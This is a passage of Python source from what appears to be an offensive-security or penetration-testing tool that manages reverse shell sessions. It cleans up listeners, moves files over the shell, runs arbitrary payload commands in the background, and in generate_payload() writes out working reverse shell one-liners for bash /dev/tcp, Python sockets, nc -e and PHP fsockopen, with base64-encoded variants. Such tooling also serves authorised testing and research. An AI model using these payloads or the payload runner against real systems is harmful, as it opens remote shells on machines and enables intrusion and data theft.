    def stop(self):
        """Stop the reverse shell listener"""
        try:
            if self.process:
                logger.info(f"Stopping reverse shell listener process (PID: {self.process.pid})")

                # The listener is spawned with shell=True under
                # preexec_fn=os.setsid, so self.process is the SHELL and the
                # actual nc/socat is its child in the same process group.
                # terminate() on the leader alone left the listener running --
                # `ss` showed nc still bound with ppid 1 while this returned
                # success and the route reported the session stopped. Signal
                # the group, the way MetasploitSession and stop_tunnel already
                # do, so the port is genuinely released.
                process_group = getattr(self.process, "pid", None)
                uses_process_group = bool(process_group and hasattr(os, "killpg"))
                try:
                    if uses_process_group:
                        os.killpg(process_group, signal.SIGTERM)
                    else:
                        self.process.terminate()

                    # Wait a bit for graceful shutdown
                    try:
                        self.process.wait(timeout=3)
                        logger.info("Process terminated gracefully")
                    except subprocess.TimeoutExpired:
                        # If it doesn't terminate gracefully, force kill
                        logger.warning("Process didn't terminate gracefully, forcing kill")
                        if uses_process_group:
                            os.killpg(process_group, getattr(signal, "SIGKILL", 9))
                        else:
                            self.process.kill()
                        self.process.wait(timeout=2)

                    # The leader can be gone while a child still holds the port:
                    # probe the group and reap whatever is left.
                    if uses_process_group:
                        try:
                            os.killpg(process_group, 0)
                        except ProcessLookupError:
                            pass
                        else:
                            os.killpg(process_group, getattr(signal, "SIGKILL", 9))

                except (ProcessLookupError, OSError) as e:
                    # Process might already be dead
                    logger.info(f"Process already terminated: {e}")

                except Exception as e:
                    logger.error(f"Error during process termination: {e}")
                    # Last resort - try to kill by PID directly
                    try:
                        os.kill(self.process.pid, signal.SIGTERM)
                        time.sleep(1)
                        os.kill(self.process.pid, signal.SIGKILL)
                    except:
                        pass

                self.process = None

            # IMPORTANT: Close PTY file descriptor to free port resources
            if self.master_fd is not None:
                try:
                    os.close(self.master_fd)
                    logger.info(f"Closed PTY master fd for port {self.port}")
                except Exception as e:
                    logger.warning(f"Error closing master_fd: {e}")
                finally:
                    self.master_fd = None

        except Exception as e:
            logger.error(f"Error stopping reverse shell: {str(e)}")

        # Stop the trigger process if running
        try:
            if hasattr(self, "trigger_process") and self.trigger_process:
                try:
                    logger.info(f"Stopping trigger process (PID: {self.trigger_process.pid})")
                    self.trigger_process.terminate()
                    try:
                        self.trigger_process.wait(timeout=3)
                        logger.info("Trigger process terminated gracefully")
                    except subprocess.TimeoutExpired:
                        logger.warning("Trigger process didn't terminate gracefully, forcing kill")
                        self.trigger_process.kill()
                        self.trigger_process.wait(timeout=2)
                except (ProcessLookupError, OSError) as e:
                    logger.info(f"Trigger process already terminated: {e}")
                except Exception as e:
                    logger.error(f"Error stopping trigger process: {e}")
                finally:
                    self.trigger_process = None

            # Note: trigger_thread will be cleaned up automatically as it's a daemon thread
            if hasattr(self, "trigger_thread") and self.trigger_thread and self.trigger_thread.is_alive():
                logger.info("Trigger thread is running and will be cleaned up automatically (daemon thread)")

        except Exception as e:
            logger.error(f"Error during trigger cleanup: {e}")

        # Always reset connection state regardless of process cleanup success
        self.is_connected = False
        logger.info("Reverse shell session stopped")

        # Additional cleanup: Force kill any remaining processes on this port
        try:
            logger.info(f"Force cleanup of port {self.port}")
            # Use lsof to find any remaining processes on this port
            lsof_result = subprocess.run(
                f"lsof -ti:{self.port}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=5
            )

            if lsof_result.stdout.strip():
                pids = [int(pid.strip()) for pid in lsof_result.stdout.strip().split('\n') if pid.strip().isdigit()]
                for pid in pids:
                    try:
                        os.kill(pid, signal.SIGKILL)
                        logger.info(f"Force killed remaining process {pid} on port {self.port}")
                    except ProcessLookupError:
                        pass  # Process already dead
                    except Exception as e:
                        logger.warning(f"Could not kill process {pid}: {e}")
        except Exception as e:
            logger.debug(f"Port cleanup check failed: {e}")

        # Give system time to free the port
        time.sleep(1)

    def upload_content(self, content: str, remote_file: str, encoding: str = "base64") -> Dict[str, Any]:
        """Upload content with checksum verification using FileTransferManager."""
        try:
            from utils.transfer_manager import transfer_manager
            return transfer_manager.upload_via_reverse_shell_with_verification(
                shell_manager=self,
                content=content,
                remote_file=remote_file,
                encoding=encoding
            )
        except Exception as e:
            logger.error(f"Error in reverse shell upload: {str(e)}")
            return {"error": str(e), "success": False}

    def download_content(self, remote_file: str, encoding: str = "base64") -> Dict[str, Any]:
        """Download content with checksum verification using FileTransferManager."""
        try:
            from utils.transfer_manager import transfer_manager
            return transfer_manager.download_via_reverse_shell_with_verification(
                shell_manager=self,
                remote_file=remote_file,
                encoding=encoding
            )
        except Exception as e:
            logger.error(f"Error in reverse shell download: {str(e)}")
            return {"error": str(e), "success": False}

    def send_payload(self, payload_command: str, timeout: int = 10, wait_seconds: int = 5) -> Dict[str, Any]:
        """
        Send a payload command (e.g., reverse shell payload) in a non-blocking way.
        The process is started in a background thread and associated with the session.
        Waits a few seconds after execution and returns session status.

        Args:
            payload_command (str): The payload command to execute
            timeout (int): Timeout for the command execution
            wait_seconds (int): Seconds to wait before checking session status

        Returns:
            Dict[str, Any]: Result dictionary with success status, message, and session status
        """
        def _run_payload():
            try:
                # Store the process so it can be terminated later
                self.trigger_process = subprocess.Popen(
                    payload_command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    preexec_fn=os.setsid
                )
                try:
                    stdout, stderr = self.trigger_process.communicate(timeout=timeout)
                    logger.info(f"Payload command completed. Exit code: {self.trigger_process.returncode}")
                    if stdout:
                        logger.debug(f"Payload stdout: {stdout.decode()}")
                    if stderr:
                        logger.debug(f"Payload stderr: {stderr.decode()}")
                except subprocess.TimeoutExpired:
                    logger.warning(f"Payload command timed out after {timeout} seconds")
                    self.trigger_process.kill()
                    try:
                        stdout, stderr = self.trigger_process.communicate(timeout=5)
                    except subprocess.TimeoutExpired:
                        pass
            except Exception as e:
                logger.error(f"Payload execution failed: {e}")
            finally:
                # Clear the process reference when done
                if hasattr(self, 'trigger_process'):
                    self.trigger_process = None

        # Start the payload in a background thread
        self.trigger_thread = threading.Thread(target=_run_payload, daemon=True)
        self.trigger_thread.start()

        logger.info(f"Payload executed: {payload_command} (non-blocking)")

        # Wait a few seconds before checking session status
        time.sleep(wait_seconds)
        session_status = self.get_status()

        return {
            "success": True,
            "message": "Payload command executed in background.",
            "payload_command": payload_command,
            "session_id": self.session_id,
            "session_status": session_status,
            "wait_time_seconds": wait_seconds
        }

    @staticmethod
    def generate_payload(local_ip: str = "127.0.0.1", local_port: int = 4444,
                        payload_type: str = "bash", encoding: str = "base64") -> Dict[str, Any]:
        """Generate reverse shell payloads"""
        try:
            payloads = {}

            if payload_type == "bash":
                bash_payload = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
                payloads["bash"] = bash_payload
                if encoding == "base64":
                    payloads["bash_base64"] = base64.b64encode(bash_payload.encode()).decode()

            elif payload_type == "python":
                python_payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_ip}\",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                payloads["python"] = python_payload
                if encoding == "base64":
                    payloads["python_base64"] = base64.b64encode(python_payload.encode()).decode()

            elif payload_type == "nc":
                nc_payload = f"nc -e /bin/sh {local_ip} {local_port}"
                payloads["nc"] = nc_payload
                if encoding == "base64":
                    payloads["nc_base64"] = base64.b64encode(nc_payload.encode()).decode()

            elif payload_type == "php":
                php_payload = f"php -r '$sock=fsockopen(\"{local_ip}\",{local_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                payloads["php"] = php_payload
                if encoding == "base64":
                    payloads["php_base64"] = base64.b64encode(php_payload.encode()).decode()

            return {
                "success": True,
                "payloads": payloads,
                "local_ip": local_ip,
                "local_port": local_port,
                "payload_type": payload_type,
                "encoding": encoding
            }
        except Exception as e:
            logger.error(f"Error generating reverse shell payload: {str(e)}")
            return {"success": False, "error": f"Failed to generate payload: {str(e)}"}
